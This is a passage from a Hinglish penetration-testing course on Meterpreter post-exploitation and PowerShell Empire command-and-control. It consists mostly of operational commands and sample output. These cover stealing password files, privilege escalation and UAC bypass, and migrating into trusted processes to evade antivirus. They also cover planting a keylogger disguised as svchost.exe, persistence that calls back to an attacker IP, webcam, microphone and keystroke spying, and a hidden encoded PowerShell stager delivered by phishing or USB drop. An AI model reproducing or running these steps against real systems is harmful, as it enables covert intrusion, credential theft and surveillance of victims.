meterpreter > getuid
# getuid: Current user identity check karta hai
Server username: VICTIM-PC\john
# Username: john (admin nahi hai)

# Check privileges
meterpreter > getprivs
# getprivs: Current user ke privileges display karta hai
Enabled Process Privileges:
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege

# List processes
meterpreter > ps
# ps: Process list display karta hai (Linux ps command ki tarah)
PID   Name              User
---   ----              ----
1234  explorer.exe      VICTIM-PC\john
# Explorer: Windows desktop process
5678  chrome.exe        VICTIM-PC\john
# Chrome browser
9012  svchost.exe       NT AUTHORITY\SYSTEM
# System service (SYSTEM privileges ke saath)

# Navigate file system
meterpreter > pwd
# pwd: Present working directory (current location)
C:\Users\john
# Current directory path

meterpreter > ls
# ls: List files and directories
Listing: C:\Users\john
======================
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2024-01-15 14:30:00 +0000  Desktop
40777/rwxrwxrwx   0     dir   2024-01-15 14:30:00 +0000  Documents
40777/rwxrwxrwx   0     dir   2024-01-15 14:30:00 +0000  Downloads

# Read file
meterpreter > cat Desktop/passwords.txt
# cat: File content read karta hai (display karta hai)
Gmail: mypassword123
Facebook: secret456
Bank: secure789
# File ka content (passwords mil gaye!)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Always check privileges first:

```bash
# Check if you're admin
meterpreter > getuid
# Current user check karo
Server username: VICTIM-PC\john
# Normal user (admin nahi)

# Check privileges
meterpreter > getprivs
# Privileges list check karo

# If not admin, try privilege escalation
meterpreter > getsystem
# getsystem: Automatic privilege escalation (SYSTEM level access)
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
# Named Pipe technique use karke SYSTEM access mil gaya

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
# NT AUTHORITY\SYSTEM = Highest privileges (admin se bhi upar)

# Now you're admin!
# Ab aap system ke complete control mein ho
```

---

## üìö Topic 10.3: Process Migration (AV/EDR Evasion)

### üéØ Topic/Technique:
**Process Migration** - Meterpreter session ko ek process se dusre process mein move karna.

### ü§î Yeh Kya Hai?
Process migration ka matlab hai apne Meterpreter session ko current process se kisi aur process mein transfer karna. Yeh useful hai jab:
- Current process unstable hai
- AV/EDR current process ko monitor kar raha hai
- Aapko higher privileges chahiye
- Session ko hide karna hai

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Migration Process:**
```
1. List running processes (ps)
2. Select target process (stable, trusted)
3. Migrate to that process
4. Meterpreter now runs in new process
5. Old process can be killed
```

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# List processes
meterpreter > ps
# ps: Running processes display karta hai (PID, name, user)

# Migrate to process ID
meterpreter > migrate 1234
# migrate: Meterpreter ko specified process mein move karta hai
# 1234: Target process ID

# Auto-migrate to safe process
meterpreter > run post/windows/manage/migrate
# run: Post-exploitation module execute karta hai
# post/windows/manage/migrate: Automatically safe process find karke migrate karta hai

# Migrate to specific process name
meterpreter > migrate -N explorer.exe
# -N: Process name se migrate karta hai (ID ki jagah)
# explorer.exe: Windows desktop process (stable aur trusted)

### üíª Step-by-Step Example:

```bash
# Check current process
meterpreter > getpid
# getpid: Current process ID display karta hai
Current pid: 5678
# Meterpreter abhi process 5678 mein run kar raha hai

meterpreter > ps
PID   Name              User
---   ----              ----
1234  explorer.exe      VICTIM-PC\john
# Explorer: Trusted Windows process
5678  payload.exe       VICTIM-PC\john  # Current (suspicious!)
# payload.exe: Suspicious name (AV detect kar sakta hai)
9012  svchost.exe       NT AUTHORITY\SYSTEM
# svchost: System service

# Migrate to explorer.exe (trusted process)
meterpreter > migrate 1234
# Process 5678 se 1234 mein migrate kar rahe hain
[*] Migrating from 5678 to 1234...
# Migration process start
[*] Migration completed successfully.
# Successfully migrate ho gaya

# Verify
meterpreter > getpid
Current pid: 1234
# Ab Meterpreter process 1234 (explorer.exe) mein hai

# Now running in explorer.exe (less suspicious)
# AV/EDR ko suspicious nahi lagega
```

### üí° Pro Tip / Galti:

**Pro Tip**: Migrate to long-running, trusted processes:

```bash
# Good migration targets:
- explorer.exe (user's desktop)
- svchost.exe (system service)
- lsass.exe (authentication)
- winlogon.exe (login process)

# Bad migration targets:
- notepad.exe (user may close)
- cmd.exe (temporary)
- payload.exe (obvious)

# Best practice:
meterpreter > migrate -N explorer.exe
```

---

## üìö Topic 10.4: File System Commands (download, upload, execute)

### üéØ Topic/Technique:
**File Operations** - Files ko download, upload, aur execute karna.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Download file
meterpreter > download C:\\Users\\john\\Documents\\passwords.txt /root/
# download: Victim se attacker machine par file copy karta hai
# Source path (victim), Destination path (attacker)

# Upload file
meterpreter > upload /root/tool.exe C:\\temp\\
# upload: Attacker se victim machine par file copy karta hai
# Source path (attacker), Destination path (victim)

# Execute file
meterpreter > execute -f C:\\temp\\tool.exe
# execute: File ko run karta hai
# -f: File path specify karta hai

# Execute with arguments
meterpreter > execute -f cmd.exe -a "/c dir C:\\" -H
# -a: Arguments pass karta hai
# /c dir C:\: Command execute karta hai
# -H: Hidden mode (window nahi dikhega)

# Search files
meterpreter > search -f *.txt -d C:\\Users\\john\\Documents
# search: Files search karta hai
# -f: Filename pattern (*.txt = all text files)
# -d: Directory specify karta hai

### üíª Step-by-Step Example:

```bash
# Download sensitive files
meterpreter > download C:\\Users\\john\\Documents\\passwords.txt
# Victim se passwords file download kar rahe hain
[*] downloading: C:\Users\john\Documents\passwords.txt -> passwords.txt
# Download progress
[*] downloaded : C:\Users\john\Documents\passwords.txt -> passwords.txt
# Successfully downloaded (attacker machine par save ho gaya)

# Upload keylogger
meterpreter > upload /root/keylogger.exe C:\\Windows\\Temp\\svchost.exe
# Keylogger upload kar rahe hain (svchost.exe naam se - legitimate lagega)
[*] uploading  : /root/keylogger.exe -> C:\Windows\Temp\svchost.exe
# Upload progress
[*] uploaded   : /root/keylogger.exe -> C:\Windows\Temp\svchost.exe
# Successfully uploaded (victim machine par)

# Execute keylogger
meterpreter > execute -f C:\\Windows\\Temp\\svchost.exe -H
# Keylogger ko hidden mode mein execute kar rahe hain
Process 9876 created.
# New process create ho gaya (keylogger ab run kar raha hai)
```

---

## üìö Topic 10.5: Persistence (persistence_service module)

### üéØ Topic/Technique:
**Persistence** - System reboot ke baad bhi access maintain karna.

### ü§î Yeh Kya Hai?
Persistence mechanisms ensure karte hain ki aapka access system reboot, user logout, ya session disconnect hone ke baad bhi bana rahe. Yeh critical hai long-term access ke liye.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Method 1: Persistence service
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.100
# run persistence: Persistence module execute karta hai
# -X: Startup folder mein install karta hai (system boot par run hoga)
# -i 60: Interval 60 seconds (har 60 seconds mein reconnect try karega)
# -p 4444: Port number (attacker ka listening port)
# -r 192.168.1.100: Remote host (attacker ka IP)

# Method 2: Registry run key
meterpreter > run persistence -U -i 60 -p 4444 -r 192.168.1.100
# -U: User registry run key (HKCU\...\Run)
# User login par automatically run hoga

# Method 3: Scheduled task
meterpreter > run scheduleme -m 60 -p 4444 -r 192.168.1.100
# scheduleme: Scheduled task create karta hai
# -m 60: Har 60 minutes mein execute hoga

### üíª Step-by-Step Example:

```bash
# Install persistence
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.100
[*] Creating a persistent agent: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\YourApp
# Registry run key create kar raha hai (system startup par run hoga)
[*] Persistent agent script is 613976 bytes long
# VBScript payload ka size
[*] Uploaded the persistent agent to C:\Windows\TEMP\abc123.vbs
# Payload file upload ho gaya
[*] Agent executed with PID 5432
# Payload execute ho gaya (process ID 5432)
[*] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\YourApp
# Registry mein entry add ho gayi (autorun)

# Verify persistence
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v YourApp
# reg queryval: Registry value check karta hai
# -k: Registry key path
# -v: Value name

# Test: Reboot system
meterpreter > reboot
# System ko reboot karta hai

# Wait for system to reboot...
# System restart ho raha hai
# New session automatically opens!
[*] Meterpreter session 2 opened
# Reboot ke baad automatically new session open ho gaya (persistence working!)
```

---

## üìö Topic 10.6: Spying (keyscan_start, screenshot, record_mic)

### üéØ Topic/Technique:
**Spying Features** - Victim ki activities monitor karna.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Keylogging
meterpreter > keyscan_start
# keyscan_start: Keylogger start karta hai (keystrokes capture karna shuru)
meterpreter > keyscan_dump
# keyscan_dump: Captured keystrokes display karta hai
meterpreter > keyscan_stop
# keyscan_stop: Keylogger stop karta hai

# Screenshot
meterpreter > screenshot
# screenshot: Current screen capture karta hai (image file save hoti hai)

# Webcam
meterpreter > webcam_list
# webcam_list: Available webcams list karta hai
meterpreter > webcam_snap
# webcam_snap: Webcam se photo capture karta hai

# Microphone
meterpreter > record_mic -d 30
# record_mic: Microphone se audio record karta hai
# -d 30: Duration 30 seconds

# Screen recording
meterpreter > screenshare
# screenshare: Real-time screen streaming (live screen dekh sakte hain)

### üíª Step-by-Step Example:

```bash
# Start keylogger
meterpreter > keyscan_start
# Keylogger activate ho gaya
Starting the keystroke sniffer...
# Keystroke sniffer = Keylogger (har key press capture karega)

# Wait 5 minutes...
# Victim ko kaam karne do (typing karega)

# Dump captured keystrokes
meterpreter > keyscan_dump
# Captured keystrokes display karo
Dumping captured keystrokes...
gmail.com
username: victim@email.com
password: MyPassword123!
# Gmail credentials captured!
facebook.com
password: SecretPass456!
# Facebook password captured!

# Take screenshot
meterpreter > screenshot
# Screen capture kar rahe hain
Screenshot saved to: /root/screenshot_2024-01-15_14-30-00.png
# Screenshot attacker machine par save ho gaya

# Capture webcam
meterpreter > webcam_snap
# Webcam se photo le rahe hain
[*] Starting...
# Webcam start ho raha hai
[*] Got frame
# Frame capture ho gaya
[*] Stopped
# Webcam stop ho gaya
Webcam shot saved to: /root/webcam_2024-01-15_14-30-05.jpg
# Photo save ho gaya (victim ki photo!)
```

---

## üìö Topic 10.7: Pivoting (autoroute module)

### üéØ Topic/Technique:
**Pivoting** - Compromised system ko gateway ki tarah use karke internal network access karna.

### ü§î Yeh Kya Hai?
Pivoting ka matlab hai ek compromised system ke through dusre systems tak pahunchna. Jab aap ek system compromise karte hain jo multiple networks se connected hai, aap us system ko "pivot point" ki tarah use kar sakte hain internal network access karne ke liye.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Add route through session
meterpreter > run autoroute -s 10.0.0.0/24
# run autoroute: Routing module execute karta hai
# -s: Subnet add karta hai (10.0.0.0/24 internal network)
# Result: Compromised system ke through internal network access

# List routes
meterpreter > run autoroute -p
# -p: Print routes (active routes display karta hai)

# Port forwarding
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.10
# portfwd: Port forwarding setup karta hai
# add: New forwarding rule add karta hai
# -l 3389: Local port (attacker machine par)
# -p 3389: Remote port (internal server par)
# -r 10.0.0.10: Remote host (internal server IP)
# Result: localhost:3389 -> 10.0.0.10:3389

# SOCKS proxy
msf > use auxiliary/server/socks_proxy
# SOCKS proxy module load karta hai
msf > set SRVPORT 1080
# SRVPORT: Proxy server port (1080 = standard SOCKS port)
msf > run
# Proxy server start karta hai

### üíª Step-by-Step Example:

```bash
# Compromised system has two networks:
# - 192.168.1.20 (external)
# - 10.0.0.5 (internal)
# Dual-homed system (do networks se connected)

# Add route to internal network
meterpreter > run autoroute -s 10.0.0.0/24
# Internal network 10.0.0.0/24 ka route add kar rahe hain
[*] Adding a route to 10.0.0.0/255.255.255.0...
# Route add ho raha hai
[+] Added route to 10.0.0.0/255.255.255.0 via 192.168.1.20
# Route successfully add ho gaya (192.168.1.20 ke through)
[*] Use the -p option to list all active routes
# -p se routes list kar sakte hain

# Now scan internal network
msf > use auxiliary/scanner/portscan/tcp
# TCP port scanner module
msf > set RHOSTS 10.0.0.1-254
# RHOSTS: Target hosts (internal network range)
msf > set PORTS 80,443,445,3389
# PORTS: Scan karne ke liye ports (HTTP, HTTPS, SMB, RDP)
msf > run
# Scan start karta hai

# Found: 10.0.0.10 has RDP open (3389)
# Internal server par RDP service mil gayi

# Port forward RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.10
# Local port 3389 ko internal server ke port 3389 se connect kar rahe hain
[*] Local TCP relay created: :3389 <-> 10.0.0.10:3389
# Port forwarding active ho gaya

# Connect to internal RDP
rdesktop 127.0.0.1:3389
# rdesktop: RDP client
# 127.0.0.1:3389: Local port (jo internal server se forward hai)
# Now connected to internal server!
# Internal server ka desktop access mil gaya!
```

---

## üìö Topic 10.8: Technique - UAC Bypassing (Silent Admin)

### üéØ Topic/Technique:
**UAC Bypass** - User Account Control ko bypass karke admin privileges pana.

### ü§î Yeh Kya Hai?
UAC (User Account Control) Windows ki security feature hai jo admin actions ke liye prompt dikhati hai. UAC bypass techniques allow karte hain ki aap bina user ko prompt dikhaaye admin privileges gain kar sako.

### ‚å®Ô∏è Zaroori Commands & Steps:

```bash
# Method 1: bypassuac module
meterpreter > background
# background: Session ko background mein bhej deta hai
msf > use exploit/windows/local/bypassuac
# use: UAC bypass module load karta hai
# exploit/windows/local/bypassuac: UAC bypass exploit
msf > set SESSION 1
# SESSION: Kon se session par exploit run karna hai
msf > exploit
# exploit: Module execute karta hai (UAC bypass attempt)

# Method 2: bypassuac_injection
msf > use exploit/windows/local/bypassuac_injection
# bypassuac_injection: Memory injection technique use karta hai (stealthier)
msf > set SESSION 1
msf > exploit

# Method 3: getsystem
meterpreter > getsystem
# getsystem: Automatic privilege escalation (multiple techniques try karta hai)
# Sabse simple method (ek command mein SYSTEM access)

### üíª Step-by-Step Example:

```bash
# Check current privileges
meterpreter > getuid
# Current user check karo
Server username: VICTIM-PC\john (not admin)
# Normal user (admin privileges nahi hain)

# Try getsystem
meterpreter > getsystem
# Direct SYSTEM access try kar rahe hain
[-] priv_elevate_getsystem: Operation failed: Access is denied.
# Failed - admin privileges nahi hain

# Use UAC bypass
meterpreter > background
# Session background mein
msf > use exploit/windows/local/bypassuac
# UAC bypass module load
msf > set SESSION 1
# Target session
msf > set LHOST 192.168.1.100
# LHOST: Attacker ka IP (new session yahan connect karega)
msf > exploit
# UAC bypass execute karo

[*] Started reverse TCP handler on 192.168.1.100:4444
# Handler listening
[*] UAC is Enabled, checking level...
# UAC enabled hai, level check kar rahe hain
[+] UAC is set to Default
# Default UAC level (bypassable)
[+] BypassUAC can bypass this setting, continuing...
# Bypass possible hai
[*] Uploading the bypass UAC executable to the filesystem...
# Bypass payload upload ho raha hai
[*] Meterpreter session 2 opened
# New session open ho gaya (elevated privileges ke saath)

# New session with admin rights!
meterpreter > getuid
Server username: VICTIM-PC\john
# Same user but ab admin privileges hain

meterpreter > getsystem
# Ab getsystem kaam karega
...got system via technique 1 (Named Pipe Impersonation).
# Named Pipe technique se SYSTEM access mil gaya

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
# NT AUTHORITY\SYSTEM = Highest level access

# Now you're SYSTEM!
# Complete system control!
```

### üí° Pro Tip / Galti:

**Pro Tip**: Try multiple UAC bypass methods:

```bash
# Method 1: bypassuac (most reliable)
use exploit/windows/local/bypassuac
# Standard UAC bypass (sabse reliable)

# Method 2: bypassuac_injection (stealthier)
use exploit/windows/local/bypassuac_injection
# Memory injection use karta hai (disk par file nahi likhta)

# Method 3: eventvwr (Windows 10)
use exploit/windows/local/bypassuac_eventvwr
# Event Viewer hijack karta hai (Windows 10 specific)

# Method 4: fodhelper (Windows 10)
use exploit/windows/local/bypassuac_fodhelper
# fodhelper.exe abuse karta hai (Windows 10 specific)

# If all fail, try social engineering:
# Ask user to run as administrator!
```

---

**üéâ Module 10 Complete! üéâ**

**Topics Covered:**
‚úÖ 10.1: Upgrading Shell
‚úÖ 10.2: Basic Commands
‚úÖ 10.3: Process Migration
‚úÖ 10.4: File System Commands
‚úÖ 10.5: Persistence
‚úÖ 10.6: Spying Features
‚úÖ 10.7: Pivoting
‚úÖ 10.8: UAC Bypassing

**Key Takeaways:**
- Meterpreter is powerful post-exploitation tool
- Always migrate to stable processes
- Persistence ensures long-term access
- Pivoting allows internal network access
- UAC bypass gives admin privileges

**Next Module:** Module 11 - Post-Exploitation (Empire & C2)

=============================================================

# üéØ Module 11: Post-Exploitation (Empire & C2)

---

## üìö Topic 11.1: Empire Agents & Basic Commands

### üéØ Topic/Technique:
**PowerShell Empire** - PowerShell-based post-exploitation framework jo fileless attacks ke liye design kiya gaya hai.

### ü§î Yeh Kya Hai?
PowerShell Empire ek pure PowerShell post-exploitation agent hai jo Windows systems par bina disk ko touch kiye (fileless) run karta hai. Yeh Meterpreter ka alternative hai with special focus on PowerShell scripting aur memory-based execution. Empire agents victim ke system par run karte hain aur attacker ke C2 (Command & Control) server se communicate karte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Fileless execution (disk par koi file nahi, sirf memory mein)
- PowerShell-native (Windows mein built-in, suspicious nahi lagta)
- AV/EDR bypass (traditional signatures detect nahi kar sakte)
- Modular architecture (200+ post-exploitation modules)
- Active development aur community support
- Real-world APT groups bhi use karte hain

### üéØ Practical Use (Asli Pentesting Mein):
- Windows post-exploitation
- Credential harvesting
- Lateral movement
- Privilege escalation
- Data exfiltration
- Persistence mechanisms
- Demonstrating fileless attacks

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Empire Architecture:**
```
1. Empire Server (Attacker's machine)
   ‚Üì
2. Listener (waits for connections)
   ‚Üì
3. Stager (small payload delivered to victim)
   ‚Üì
4. Agent (full PowerShell agent on victim)
   ‚Üì
5. Modules (post-exploitation tasks)
```

**Working Process:**
```
Step 1: Attacker creates listener on Empire server
Step 2: Generates stager (launcher code)
Step 3: Victim executes stager (via phishing, exploit, etc.)
Step 4: Stager downloads full agent from listener
Step 5: Agent runs in memory (no disk writes)
Step 6: Agent connects back to Empire server
Step 7: Attacker can now run modules on agent
```

### üëç Pros (Fayde):
- Fileless execution (memory-only, no disk artifacts)
- PowerShell-native (blends with normal Windows activity)
- Encrypted communication (HTTPS, DNS, etc.)
- 200+ post-exploitation modules
- Credential harvesting built-in
- Easy to use interface
- Active community

### üëé Cons (Nuksaan):
- PowerShell logging can detect it (if enabled)
- Modern EDR solutions can detect behavior
- Requires PowerShell (not available on all systems)
- AMSI (Anti-Malware Scan Interface) can block it
- Network traffic patterns may be suspicious
- Discontinued (original project), but forks exist

### ‚å®Ô∏è Zaroori Commands & Steps:

**Empire Installation:**
```bash
# Clone Empire repository
git clone https://github.com/BC-SECURITY/Empire.git
# git clone: GitHub se repository download karta hai
# https://github.com/BC-SECURITY/Empire.git: Empire ka official repository
# Yeh command Empire ka latest version download karta hai GitHub se

cd Empire
# cd: Change directory command
# Empire directory mein enter karte hain

./setup/install.sh
# ./: Current directory mein script execute karta hai
# setup/install.sh: Installation script
# Installation script run karta hai jo dependencies install karta hai
# Dependencies: Python packages, PowerShell modules, etc.

# Start Empire server
./empire --rest
# ./empire: Empire executable run karta hai
# --rest: REST API enable karta hai (web interface ke liye)
# Empire server start hota hai with REST API enabled
```

**Basic Empire Commands:**
```bash
# Empire start karne ke baad aapko prompt milega:

(Empire) >
# Yeh main Empire prompt hai jahan se aap commands run karte hain

# List all listeners
(Empire) > listeners
# Yeh command sabhi active listeners ko list karta hai
# Listeners wo hain jo victim connections wait karte hain

# List all agents
(Empire) > agents
# Yeh command sabhi connected agents (compromised systems) ko dikhata hai

# Interact with specific agent
(Empire) > interact <AGENT_NAME>
# Specific agent ke saath interact karne ke liye
# Example: interact ABC123

# Get help
(Empire) > help
# Sabhi available commands ki list dikhata hai

# Exit Empire
(Empire) > exit
# Empire server se exit karta hai
```

### üíª Step-by-Step Example:

**Scenario: Setting Up Empire and Getting First Agent**

**Step 1: Start Empire Server**
```bash
# Terminal mein Empire start karo
cd /opt/Empire
# cd: Change directory
# /opt/Empire: Empire installation directory (default location)
./empire
# ./empire: Empire server execute karta hai
# Interactive console start hoga

# Output dikhega:
 ==================================================================================
                              Empire 4.0 | [BC Security]
 ==================================================================================
        380 modules currently loaded

        0 listeners currently active
        0 agents currently active

# Yeh output batata hai:
# - Empire version 4.0 chal raha hai
# - 380 modules available hain
# - Abhi koi listener ya agent active nahi hai

(Empire) >
# Ab aap Empire prompt par hain, commands run kar sakte hain
```

**Step 2: Create HTTP Listener**
```bash
# Listener create karne ke liye
(Empire) > listeners
# listeners: Listener management menu open karta hai
# Yeh command listeners menu mein le jata hai

(Empire: listeners) > uselistener http
# uselistener: Listener type select karta hai
# http: HTTP/HTTPS listener (web-based communication)
# HTTP listener basic web-based communication use karta hai
# Victim HTTP requests ke through connect karega

(Empire: listeners/http) > info
# info: Current module/listener ki information display karta hai
# Listener ki details dekhne ke liye
# Yeh sabhi configurable options dikhata hai
# Options: Name, Host, Port, Delay, Jitter, etc.

# Output:
Name: HTTP[S]
Category: client_server
Authors: @harmj0y
Description: Starts a http[s] listener that uses a GET/POST approach.

HTTP[S] Options:
  Name              Required    Value                            Description
  ----              --------    -------                          -----------
  Name              True        http                             Name for the listener
  Host              True        http://192.168.1.100:8080        Hostname/IP for staging
  BindIP            True        0.0.0.0                          The IP to bind to on the control server
  Port              True        8080                             Port for the listener
  DefaultDelay      True        5                                Agent delay/reach back interval (in seconds)
  DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0)
  DefaultProfile    True        /admin/get.php,/news.php         Default communication profile for the agent

# Explanation of important options:
# - Name: Listener ka naam (identification ke liye)
# - Host: Victim ko yeh URL diya jayega (staging ke liye)
# - BindIP: Server kis IP par listen karega (0.0.0.0 = all interfaces)
# - Port: Kis port par listen karega
# - DefaultDelay: Agent kitne seconds baad check-in karega
# - DefaultJitter: Delay mein randomness (detection avoid karne ke liye)
# - DefaultProfile: URLs jo agent use karega (normal traffic jaisa dikhne ke liye)

# Configure listener
(Empire: listeners/http) > set Host http://192.168.1.100:8080
# set: Option ki value set karta hai
# Host: Staging URL (victim ko yeh URL diya jayega)
# http://192.168.1.100:8080: Attacker ka IP aur port
# Yeh attacker ka IP aur port set karta hai
# Victim yahan se agent download karega

(Empire: listeners/http) > set Port 8080
# Port: Listener kis port par listen karega
# 8080: Port number (common alternative HTTP port)
# Port 8080 par listen karega
# Aap koi bhi port use kar sakte hain (80, 443, 8080, etc.)

(Empire: listeners/http) > execute
# execute: Current configuration ke saath listener start karta hai
# Listener start karta hai
# Ab connections accept karne ke liye ready hai

# Output:
[*] Starting listener 'http'
[+] Listener successfully started!

# Ab listener active hai aur connections wait kar raha hai

(Empire: listeners/http) > back
# back: Previous menu mein wapas jata hai
# Main menu mein wapas aate hain

(Empire) > listeners
# listeners: Active listeners list karta hai
# Active listeners check karte hain
# Sabhi running listeners dikhenge

# Output:
[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     http              http://192.168.1.100:8080            native    5/0.0                      

# Yeh dikhata hai:
# - ID: 1 (listener ka unique ID)
# - Name: http (listener ka naam)
# - Host: http://192.168.1.100:8080 (staging URL)
# - Type: native (PowerShell-based)
# - Delay/Jitter: 5/0.0 (5 seconds delay, no jitter)
```

**Step 3: Generate Stager (Launcher)**
```bash
# Stager generate karne ke liye
(Empire) > usestager windows/launcher_bat
# usestager: Stager module select karta hai
# windows/launcher_bat: Windows batch file stager
# Windows ke liye BAT file stager select karte hain
# Yeh ek batch file create karega jo victim execute karega

(Empire: stager/windows/launcher_bat) > info
# info: Stager ki details display karta hai
# Stager ki details dekhte hain
# Options, description, authors, etc.

# Output:
Name: BAT Launcher
Description: Generates a self-deleting .bat launcher for Empire
Authors: @harmj0y
Options:
  Name             Required    Value             Description
  ----             --------    -----             -----------
  Listener         True                          Listener to generate stager for
  Language         True        powershell        Language of the stager to generate
  OutFile          False       /tmp/launcher.bat File to output .bat to
  Obfuscate        False       False             Switch. Obfuscate the launcher powershell code
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use

# Explanation:
# - Listener: Kis listener ke liye stager banana hai
# - Language: PowerShell code generate hoga
# - OutFile: Output file ka path
# - Obfuscate: Code ko obfuscate karna hai ya nahi (detection avoid karne ke liye)

(Empire: stager/windows/launcher_bat) > set Listener http
# set Listener: Kis listener ke liye stager banana hai
# http: Listener ka naam (jo humne pehle create kiya)
# Listener set karte hain (jo humne pehle banaya tha)

(Empire: stager/windows/launcher_bat) > set OutFile /root/launcher.bat
# set OutFile: Output file path specify karta hai
# /root/launcher.bat: File kahan save hogi
# Output file ka path set karte hain

(Empire: stager/windows/launcher_bat) > execute
# execute: Stager generate karta hai with current settings
# Stager generate karta hai
# BAT file create ho jayegi

# Output:
[*] Stager output written out to: /root/launcher.bat

# Ab launcher.bat file create ho gayi hai
```

**Step 4: Examine Generated Stager**
```bash
# Generated BAT file ko dekhte hain
cat /root/launcher.bat
# cat: File content display karta hai
# /root/launcher.bat: Generated stager file

# Output (simplified):
@echo off
powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAD0AWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgA7ACQASwA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEEANgBBAEMAOABBAEwAdwBBAHgAT...

# Explanation of command:
# @echo off - Console output hide karta hai
# powershell.exe - PowerShell execute karta hai
# -NoP - No Profile (faster execution)
# -sta - Single-threaded apartment (compatibility)
# -NonI - Non-interactive mode
# -W Hidden - Window hidden (victim ko nahi dikhega)
# -Enc - Encoded command (Base64 encoded PowerShell code)

# Yeh encoded command kya karta hai:
# 1. TLS 1.2 enable karta hai (secure communication)
# 2. Empire server se connect karta hai (http://192.168.1.100:8080)
# 3. Full agent download karta hai
# 4. Agent ko memory mein execute karta hai (no disk write)
# 5. Agent Empire server se communicate karna start karta hai
```

**Step 5: Deliver Stager to Victim**
```bash
# Method 1: Email attachment
# launcher.bat ko email mein attach karke victim ko bhejo

# Method 2: USB drop
# launcher.bat ko USB mein copy karke victim ke paas chhod do

# Method 3: Social engineering
# Victim ko convince karo ki yeh legitimate file hai

# Method 4: Exploit delivery
# Agar aapke paas exploit hai, toh launcher.bat execute karwao
```

**Step 6: Victim Executes Stager**
```
Victim's perspective:
1. Victim launcher.bat file ko double-click karta hai
2. Ek second ke liye black window flash hota hai (bahut fast)
3. Kuch nahi dikhta (window hidden tha)
4. Victim ko lagta hai file kaam nahi kari

Behind the scenes:
1. BAT file PowerShell command execute karta hai
2. PowerShell Empire server se connect karta hai
3. Full agent download hota hai (memory mein)
4. Agent execute hota hai (memory mein, no disk write)
5. Agent Empire server ko check-in karta hai
6. Connection establish ho jata hai
```

**Step 7: Agent Check-in**
```bash
# Empire console mein notification aata hai:
[*] Sending agent (stage 2) to 192.168.1.20
[+] Initial agent ABC123 from 192.168.1.20 now active (Slack)

# Yeh message batata hai:
# - Stage 2 (full agent) victim ko bheja gaya
# - Agent ka naam: ABC123 (randomly generated)
# - Victim ka IP: 192.168.1.20
# - Agent active hai aur communicate kar raha hai

# Agents list check karte hain
(Empire) > agents

# Output:
[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            Delay    Last Seen
 ----     -- -----------     ------------      --------                -------            -----    ---------
 ABC123   ps 192.168.1.20    VICTIM-PC         VICTIM-PC\john          powershell/1234    5/0.0    2024-01-15 14:30:00

# Explanation:
# - Name: ABC123 (agent ka unique identifier)
# - La: ps (language = PowerShell)
# - Internal IP: 192.168.1.20 (victim ka IP address)
# - Machine Name: VICTIM-PC (computer ka naam)
# - Username: VICTIM-PC\john (current user)
# - Process: powershell/1234 (PowerShell process ID 1234 mein chal raha hai)
# - Delay: 5/0.0 (har 5 seconds mein check-in karta hai, no jitter)
# - Last Seen: Last check-in time
```

**Step 8: Interact with Agent**
```bash
# Agent ke saath interact karne ke liye
(Empire) > interact ABC123
# interact: Specific agent ke saath interact karta hai
# ABC123: Agent ka unique identifier
# ABC123 agent select karte hain

(Empire: ABC123) >
# Ab aap agent ke prompt par hain
# Agent-specific commands run kar sakte hain
# Yahan se aap victim ke system par commands run kar sakte hain

# Basic information gather karte hain
(Empire: ABC123) > sysinfo
# sysinfo: System information display karta hai
# System information command run karta hai
# OS, hostname, username, privileges, etc.

# Output:
Listener:       http
Internal IP:    192.168.1.20
Username:       VICTIM-PC\john
Hostname:       VICTIM-PC
OS:             Microsoft Windows 10 Pro
High Integrity: 0
Process Name:   powershell
Process ID:     1234
Language:       powershell
Language Version: 5

# Explanation:
# - Listener: http (kis listener se connected hai)
# - Internal IP: 192.168.1.20 (victim ka local IP)
# - Username: VICTIM-PC\john (current user - not admin)
# - Hostname: VICTIM-PC (computer name)
# - OS: Windows 10 Pro (operating system)
# - High Integrity: 0 (admin rights nahi hain, 0 = normal user, 1 = admin)
# - Process Name: powershell (kis process mein chal raha hai)
# - Process ID: 1234 (process ka ID)
# - Language: powershell (agent type)
# - Language Version: 5 (PowerShell version 5)

